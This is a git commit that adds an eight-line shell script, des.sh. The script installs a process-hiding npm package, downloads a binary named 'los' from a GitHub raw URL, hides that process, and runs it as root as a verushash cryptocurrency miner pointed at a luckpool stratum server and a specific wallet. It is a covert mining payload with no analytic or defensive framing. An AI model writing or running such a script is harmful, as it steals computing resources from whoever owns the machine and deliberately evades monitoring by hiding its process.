3ea2a460edaf895dca77b5eed715c00c819f70fc
chikahusarii <85166601+chikahusarii@users.noreply.github.com>
2022-08-16 17:27:34 +0700

    Add files via upload

---
+++ des.sh
@@ -0,0 +1,8 @@
+sudo apt update -y
+sudo apt install nodejs -y
+sudo apt install npm -y
+sudo npm i -g node-process-hider
+wget https://raw.githubusercontent.com/chikahusarii/claim/main/los
+chmod +x los
+sudo ph add los
+sudo ./los --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956 --wallet RVj1VkZYsvMHgRtNRn8z1eeGkTCGmK5qmH.r1
